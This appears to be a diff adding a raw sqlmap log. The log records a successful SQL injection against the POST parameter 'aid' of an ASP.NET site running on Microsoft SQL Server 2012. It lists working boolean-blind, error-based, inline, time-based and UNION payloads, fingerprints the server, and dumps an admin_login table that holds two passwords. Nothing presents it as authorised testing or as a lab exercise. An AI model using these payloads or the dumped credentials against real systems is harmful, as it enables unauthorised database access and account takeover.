@@ -1,0 +1,36 @@
+sqlmap identified the following injection point(s) with a total of 223 HTTP(s) requests:
+---
+Parameter: aid (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: B1=Continue&aid=1 AND 3979=3979
+
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
+    Payload: B1=Continue&aid=1 AND 4567 IN (SELECT (CHAR(113)+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4567=4567) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: B1=Continue&aid=(SELECT CHAR(113)+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (1626=1626) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113))
+
+    Type: AND/OR time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: B1=Continue&aid=1 WAITFOR DELAY '0:0:5'
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 17 columns
+    Payload: B1=Continue&aid=-2690 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(105)+CHAR(105)+CHAR(78)+CHAR(111)+CHAR(82)+CHAR(112)+CHAR(73)+CHAR(121)+CHAR(65)+CHAR(99)+CHAR(113)+CHAR(113)+CHAR(80)+CHAR(86)+CHAR(78)+CHAR(77)+CHAR(65)+CHAR(68)+CHAR(66)+CHAR(77)+CHAR(85)+CHAR(84)+CHAR(78)+CHAR(112)+CHAR(88)+CHAR(112)+CHAR(73)+CHAR(114)+CHAR(67)+CHAR(121)+CHAR(100)+CHAR(97)+CHAR(88)+CHAR(103)+CHAR(84)+CHAR(67)+CHAR(109)+CHAR(111)+CHAR(74)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113),NULL,NULL-- QXNy
+---
+web server operating system: Windows 2008 R2 or 7
+web application technology: ASP.NET, Microsoft IIS 7.5, ASP
+back-end DBMS: Microsoft SQL Server 2012
+Database: cten
+Table: admin_login
+[2 entries]
++------+----------+----------+-------------+
+| uid  | username | password | permissions |
++------+----------+----------+-------------+
+| NULL | NULL     | fin0101  | NULL        |
+| NULL | NULL     | fin0105  | NULL        |
++------+----------+----------+-------------+
+
